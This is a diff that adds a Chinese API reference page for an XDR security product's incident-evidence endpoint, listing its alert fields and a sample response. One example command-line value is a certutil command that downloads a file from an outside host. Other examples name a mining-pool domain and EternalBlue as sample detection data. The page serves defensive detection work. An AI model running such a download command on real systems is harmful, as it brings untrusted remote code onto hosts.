@@ -1,0 +1,718 @@
+/api/xdr/v1/incidents/:uuid/proof
+根据事件uuId获取举证信息
+更新时间：2023-07-17 19:25:10
+REST 参数
+参数名 	类型  	必填  	说明 	示例 	全部收缩	
+uuId
+[string]
+是	事件id		收缩	
+数据字典：
+"incident-519d8808-83c9-48db-8a18-36cc8c099650"	| [string]	| 默认值
+最小长度：
+最大长度：
+最小值：
+最大值：
+返回参数
+★
+成功 (200)
+JSON 最外层结构为：Object  切换成文本视图
+参数名 	类型  	必含  	说明 	示例 	全部收缩	
+code
+[string]
+是		"Success"	收缩	
+参数示例：
+"Success"
+最小长度：
+最大长度：
+最小值：
+最大值：
+message
+[string]
+是		"成功"	收缩	
+参数示例：
+"成功"
+最小长度：
+最大长度：
+最小值：
+最大值：
+Θdata
+[array]
+是				
+name
+[string]
+是	事件名称	"主机存在通过命令添加防火墙白名单异常行为"	收缩	
+参数示例：
+"主机存在通过命令添加防火墙白名单异常行为"
+最小长度：
+最大长度：
+最小值：
+最大值：
+uuId
+[string]
+是	事件id	"incident-519d8808-83c9-48db-8a18-36cc8c099650"	收缩	
+参数示例：
+"incident-519d8808-83c9-48db-8a18-36cc8c099650"
+最小长度：
+最大长度：
+最小值：
+最大值：
+endTime
+[long]
+是	事件最近发生时间	1681966547	收缩	
+参数示例：
+1681966547
+最小长度：
+最大长度：
+最小值：
+最大值：
+eventThreatDefine
+[array]
+是	事件定性	[ "业务不规范"]	收缩	
+参数示例：
+[ "业务不规范"]
+最小长度：
+最大长度：
+最小值：
+最大值：
+severity
+[int]
+是	事件等级	1	收缩	
+数据字典：
+0	| [int]
+|
+信息
+1	| [int]
+|
+低危
+2	| [int]
+|
+中危
+3	| [int]
+|
+高危
+4	| [int]
+|
+严重
+参数示例：
+1
+最小长度：
+最大长度：
+最小值：
+最大值：
+riskTag
+[array]
+是	事件标签	[ "挖矿"]	收缩	
+参数示例：
+[ "挖矿"]
+最小长度：
+最大长度：
+最小值：
+最大值：
+dataSource
+[array]
+是	事件数据源	[ "EDR", "NDR"]	收缩	
+参数示例：
+[ "EDR", "NDR"]
+最小长度：
+最大长度：
+最小值：
+最大值：
+ΘalertTimeLine
+[array]
+是	时间线		收缩	
+最小长度：
+最大长度：
+最小值：
+最大值：
+name
+[string]
+是	告警名称	"windows系统命令ipconfig执行"	收缩	
+参数示例：
+"windows系统命令ipconfig执行"
+最小长度：
+最大长度：
+最小值：
+最大值：
+alertId
+[string]
+是	告警id	"alert-3ef2a1a4-9ca5-4944-88cb-06a1c1955ffa"	收缩	
+参数示例：
+"alert-3ef2a1a4-9ca5-4944-88cb-06a1c1955ffa"
+最小长度：
+最大长度：
+最小值：
+最大值：
+lastTime
+[long]
+是	告警最近发生时间	1681440057	收缩	
+参数示例：
+1681440057
+最小长度：
+最大长度：
+最小值：
+最大值：
+severity
+[int]
+是	告警等级	50	收缩	
+数据字典：
+(0,10]	| [int]
+|
+信息
+| 默认值
+(10,30]	| [int]
+|
+低危
+(30,50]	| [int]
+|
+中危
+(50,70]	| [int]
+|
+高危
+(70,100]	| [int]
+|
+严重
+参数示例：
+50
+最小长度：
+最大长度：
+最小值：
+最大值：
+threatSubTypeDesc
+[string]
+是	告警威胁分类（三级）-中文	"挖矿"	收缩	
+参数示例：
+"挖矿"
+最小长度：
+最大长度：
+最小值：
+最大值：
+stage
+[int]
+是	告警阶段	80	收缩	
+数据字典：
+0	| [int]
+|
+默认值
+| 默认值
+10	| [int]
+|
+存在风险
+20	| [int]
+|
+扫描探测
+30	| [int]
+|
+遭受攻击
+40	| [int]
+|
+主机异常
+50	| [int]
+|
+内网扩散
+60	| [int]
+|
+C&C通信
+70	| [int]
+|
+黑产牟利
+80	| [int]
+|
+窃取数据
+参数示例：
+80
+最小长度：
+最大长度：
+最小值：
+最大值：
+devSourceNames
+[array]
+是	告警设备来源	["SIP (sangforsip)"]	收缩	
+参数示例：
+["SIP (sangforsip)"]
+最小长度：
+最大长度：
+最小值：
+最大值：
+Θproof
+[object]
+是	告警举证		收缩	
+最小长度：
+最大长度：
+最小值：
+最大值：
+dataType
+[string]
+是	举证类型，不同类型对应不同的返回值	"NDR"	收缩	
+数据字典：
+NDR	| [string]
+|
+NDR类型
+| 默认值
+webshell	| [string]
+|
+webshell类型
+SFAV_RISK_IOC	| [string]
+|
+IOC类型
+SFAV_RISK_SIP	| [string]
+|
+SIP联动
+SFAV_RISK_HOTPATCH	| [string]
+|
+轻补丁引擎
+SFAV_RISK_MEMDETECT	| [string]
+|
+内存扫描引擎
+SFAV_RISK_RTSADR	| [string]
+|
+漏洞检测引擎
+DNS_ACTION	| [string]
+|
+查询域名行为
+TASK_CREATE_ACTION	| [string]
+|
+查询计划任务创建行为
+IMG_LOADING_ACTION	| [string]
+|
+查询模块加载行为
+FILE_ACTION	| [string]
+|
+查询文件行为
+PROCESS_OPR_ACTION	| [string]
+|
+查询进程操作行为
+REG_ACTION	| [string]
+|
+查询注册表行为
+NET_CONN_ACTION	| [string]
+|
+查询网络连接行为
+EDR_COMMON	| [string]
+|
+EDR其他类型
+qinteng-reverse-shell	| [string]
+|
+反弹shell
+参数示例：
+"NDR"
+最小长度：
+最大长度：
+最小值：
+最大值：
+srcIps
+[array]
+是	源ip数组-不包括资产组	["192.168.50.190" ]	收缩	
+参数示例：
+["192.168.50.190" ]
+最小长度：
+最大长度：
+最小值：
+最大值：
+dstIps
+[array]
+是	目的ip数组-不包括资产组	["223.6.6.6","223.5.5.5"]	收缩	
+参数示例：
+["223.6.6.6","223.5.5.5"]
+最小长度：
+最大长度：
+最小值：
+最大值：
+attackResult
+[int]
+是	攻击结果	1	收缩	
+数据字典：
+0	| [int]
+|
+尝试
+| 默认值
+1	| [int]
+|
+成功
+2	| [int]
+|
+失败
+3	| [int]
+|
+失陷
+参数示例：
+1
+最小长度：
+最大长度：
+最小值：
+最大值：
+srcIpDesc
+[array]
+是	源ip数组-包括资产组/地域	[ "192.168.50.190(管理IP范围)" ]	收缩	
+参数示例：
+[ "192.168.50.190(管理IP范围)" ]
+最小长度：
+最大长度：
+最小值：
+最大值：
+dstIpDesc
+[array]
+是	目的ip数组-包括资产组/地域	[ "223.6.6.6(浙江)", "223.5.5.5(中国)"]	收缩	
+参数示例：
+[ "223.6.6.6(浙江)", "223.5.5.5(中国)"]
+最小长度：
+最大长度：
+最小值：
+最大值：
+xForwardedFor
+[array]
+-	xForwardedFor(NDR/webshell)	[ "2000:0:0:0:0:0:0:1" ]	收缩	
+参数示例：
+[ "2000:0:0:0:0:0:0:1" ]
+最小长度：
+最大长度：
+最小值：
+最大值：
+dnsQueries
+[string]
+-	dns查询(NDR/webshell)	"aaa"	收缩	
+参数示例：
+"aaa"
+最小长度：
+最大长度：
+最小值：
+最大值：
+dnsAnswers
+[string]
+-	dns响应(NDR/webshell)	"192.168.83.99"	收缩	
+参数示例：
+"192.168.83.99"
+最小长度：
+最大长度：
+最小值：
+最大值：
+engineName
+[array]
+-	引擎名称(除NDR/webshell之外的类型)	"IOA"	收缩	
+参数限制：
+E侧告警，IOC、IOA等举证
+参数示例：
+"IOA"
+最小长度：
+最大长度：
+最小值：
+最大值：
+srcIp
+[string]
+-	源IP(除NDR/webshell之外的类型)	"55.55.55.55"	收缩	
+参数限制：
+E侧告警，IOC、IOA等举证
+参数示例：
+"55.55.55.55"
+最小长度：
+最大长度：
+最小值：
+最大值：
+dstIp
+[string]
+-	目的IP(除NDR/webshell之外的类型)	"222.11.1.1"	收缩	
+参数限制：
+E侧告警，IOC、IOA等举证
+参数示例：
+"222.11.1.1"
+最小长度：
+最大长度：
+最小值：
+最大值：
+mitreIds
+[array]
+-	ATTCK战技术(除NDR/webshell之外的类型)	[ "TA0011.T1104" ]	收缩	
+参数限制：
+E侧告警，IOC、IOA等举证，通过调用/api/xdr/v1/alerts/attckTechniques接口获取攻击战映射信息
+参数示例：
+[ "TA0011.T1104" ]
+最小长度：
+最大长度：
+最小值：
+最大值：
+matchPros
+[array]
+-	父进程名称(除NDR/webshell之外的类型)	[ "taskeng.exe"]	收缩	
+参数限制：
+E侧告警，IOC、IOA等举证
+参数示例：
+[ "taskeng.exe"]
+最小长度：
+最大长度：
+最小值：
+最大值：
+domain
+[string]
+-	原始告警-域名(除NDR/webshell之外的类型)	"xmr.crypto-pool.fr"	收缩	
+参数限制：
+E侧告警，IOC、IOA等举证
+参数示例：
+"xmr.crypto-pool.fr"
+最小长度：
+最大长度：
+最小值：
+最大值：
+vulInfo
+[string]
+-	原始告警-漏洞信息(除NDR/webshell之外的类型)	"远程命令执行漏洞"	收缩	
+参数限制：
+E侧告警，IOC、IOA等举证
+参数示例：
+"远程命令执行漏洞"
+最小长度：
+最大长度：
+最小值：
+最大值：
+cve
+[string]
+-	原始告警-CVE编号(除NDR/webshell之外的类型)	"CVE-2021-33739"	收缩	
+参数限制：
+E侧告警，IOC、IOA等举证
+参数示例：
+"CVE-2021-33739"
+最小长度：
+最大长度：
+最小值：
+最大值：
+vulType
+[string]
+-	原始告警-漏洞类型	"命令注入"	收缩	
+参数限制：
+E侧告警，IOC、IOA等举证
+参数示例：
+"命令注入"
+最小长度：
+最大长度：
+最小值：
+最大值：
+appType
+[string]
+-	原始告警-应用类型(除NDR/webshell之外的类型)	"weblogc 1.0.0"	收缩	
+参数限制：
+E侧告警，IOC、IOA等举证
+参数示例：
+"weblogc 1.0.0"
+最小长度：
+最大长度：
+最小值：
+最大值：
+languageType
+[string]
+-	原始告警-语言类型(除NDR/webshell之外的类型)	"java 1.8/php 7.0"	收缩	
+参数限制：
+E侧告警，IOC、IOA等举证
+参数示例：
+"java 1.8/php 7.0"
+最小长度：
+最大长度：
+最小值：
+最大值：
+proto
+[string]
+-	原始告警-协议(除NDR/webshell之外的类型)	"TCP"	收缩	
+参数限制：
+E侧告警，IOC、IOA等举证
+参数示例：
+"TCP"
+最小长度：
+最大长度：
+最小值：
+最大值：
+ruleName
+[string]
+-	原始告警-规则名称(除NDR/webshell之外的类型)	"通过Certutil下载可疑文件"	收缩	
+参数限制：
+E侧告警，IOC、IOA等举证
+参数示例：
+"通过Certutil下载可疑文件"
+最小长度：
+最大长度：
+最小值：
+最大值：
+cmdLine
+[string]
+-	原始告警-命令行(除NDR/webshell之外的类型)	"cmd.exe /c certutil -urlcache -split -f http://cert.beah.com/cert.php"	收缩	
+参数限制：
+E侧告警，IOC、IOA等举证
+参数示例：
+"cmd.exe /c certutil -urlcache -split -f http://cert.beah.com/cert.php"
+最小长度：
+最大长度：
+最小值：
+最大值：
+name
+[string]
+-	原始告警-文件名称/进程名称(除NDR/webshell之外的类型)	"cmd.exe"	收缩	
+参数限制：
+E侧告警，IOC、IOA等举证
+参数示例：
+"cmd.exe"
+最小长度：
+最大长度：
+最小值：
+最大值：
+pid
+[string]
+-	原始告警-进程pid(除NDR/webshell之外的类型)	"3888"	收缩	
+参数限制：
+E侧告警，IOC、IOA等举证
+参数示例：
+"3888"
+最小长度：
+最大长度：
+最小值：
+最大值：
+path
+[string]
+-	原始告警-文件路径(除NDR/webshell之外的类型)	"c:\\windows\\system32\\cmd.exe"	收缩	
+参数限制：
+E侧告警，IOC、IOA、webshell等举证
+参数示例：
+"c:\\windows\\system32\\cmd.exe"
+最小长度：
+最大长度：
+最小值：
+最大值：
+regKey
+[string]
+-	原始告警-注册表Key(除NDR/webshell之外的类型)	"c:\\windows\\system32\\cmd.exe"	收缩	
+参数限制：
+E侧告警，IOC、IOA等举证
+参数示例：
+"c:\\windows\\system32\\cmd.exe"
+最小长度：
+最大长度：
+最小值：
+最大值：
+regValue
+[string]
+-	原始告警-注册表值(除NDR/webshell之外的类型)	"\"C:\\Users\\Sangfor\\AppData\\Local\\Package Cache\\{c60fd5ac-367d-4e3a-a975-f157502ac30a}\\python-3.10.2-amd64.exe\" /burn.runonce"	收缩	
+参数限制：
+E侧告警，IOC、IOA等举证
+参数示例：
+"\"C:\\Users\\Sangfor\\AppData\\Local\\Package Cache\\{c60fd5ac-367d-4e3a-a975-f157502ac30a}\\python-3.10.2-amd64.exe\" /burn.runonce"
+最小长度：
+最大长度：
+最小值：
+最大值：
+fileMd5
+[string]
+-	原始告警-文件md5(除NDR/webshell之外的类型)	"82713bc7177862a0d804e6059c8920ef"	收缩	
+参数限制：
+E侧告警，IOC、IOA等举证
+参数示例：
+"82713bc7177862a0d804e6059c8920ef"
+最小长度：
+最大长度：
+最小值：
+最大值：
+user
+[string]
+-	原始告警-任务用户(除NDR/webshell之外的类型)	"S-1-5-18"	收缩	
+参数限制：
+E侧告警，IOC、IOA等举证
+参数示例：
+"S-1-5-18"
+最小长度：
+最大长度：
+最小值：
+最大值：
+taskFrequency
+[string]
+-	原始告警-任务频率(除NDR/webshell之外的类型)	"50 MINUTE"	收缩	
+参数限制：
+E侧告警，IOC、IOA等举证
+参数示例：
+"50 MINUTE"
+最小长度：
+最大长度：
+最小值：
+最大值：
+virusFileMd5
+[array]
+-	病毒文件MD5(webshell)	[ "9744f0000284c2807de0651c7e0d980a" ]	收缩	
+参数限制：
+E侧告警，webshell、病毒等举证
+参数示例：
+[ "9744f0000284c2807de0651c7e0d980a" ]
+最小长度：
+最大长度：
+最小值：
+最大值：
+virusName
+[array]
+-	病毒名(webshell)	[ "Exploit.Win32.EternalBlue.uwzg"]	收缩	
+参数限制：
+E侧告警，webshell、病毒等举证
+参数示例：
+[ "Exploit.Win32.EternalBlue.uwzg"]
+最小长度：
+最大长度：
+最小值：
+最大值：
+virusType
+[string]
+-	病毒类型(webshell)	"Exploit"	收缩	
+参数限制：
+E侧告警，webshell、病毒等举证
+参数示例：
+"Exploit"
+最小长度：
+最大长度：
+最小值：
+最大值：
+返回示例
+
+成功示例失败示例
+
+HTTP Status Code:200 Content-Type:application/json; charset=UTF-8 √格式整理
+Θ{
+    "code":"Success",
+    "message":"成功",
+    "data":Θ{
+        "uuId":"incident-f01c6969-ba43-4819-b008-64ebca310dc7",
+        "name":"主机存在[测试自定义规则like]windows系统命令ipconfig执行",
+        "severity":4,
+        "riskTag":Θ[
+            "A005_B007"
+        ],
+        "endTime":1685862021,
+        "dataSource":Θ[
+            "NDR"
+        ],
+        "threatDefineName":Θ[
+            "未定性威胁"
+        ],
+        "incidentTimeLines":Θ[
+            Θ{
+                "severity":90,
+                "name":"[测试自定义规则like]windows系统命令ipconfig执行",
+                "alertId":"alert-0b7ef6c1-552b-4c29-8a59-2bc5bc6072ba-all-like",
+                "lastTime":1683790018,
+                "threatSubTypeDesc":"系统命令注入",
+                "stage":"遭受攻击",
+                "devSourceNames":Θ[
+                    "STA (B501C49C)"
+                ],
+                "proof":Θ{
+                    "dataType":"NDR",
+                    "srcIps":Θ[
+                        "119.23.44.44"
+                    ],
+                    "dstIps":Θ[
+                        "192.168.13.13"
+                    ],
+                    "srcIpDesc":Θ[
+                        "119.23.44.44(广东)"
+                    ],
+                    "dstIpDesc":Θ[
+                        "192.168.13.13(管理IP范围)"
+                    ],
+                    "attackResult":1,
+                    "xforwardedFor":Θ[
+                        "192.168.110.119"
+                    ]
+                }
+            }
+        ]
+    }
+}
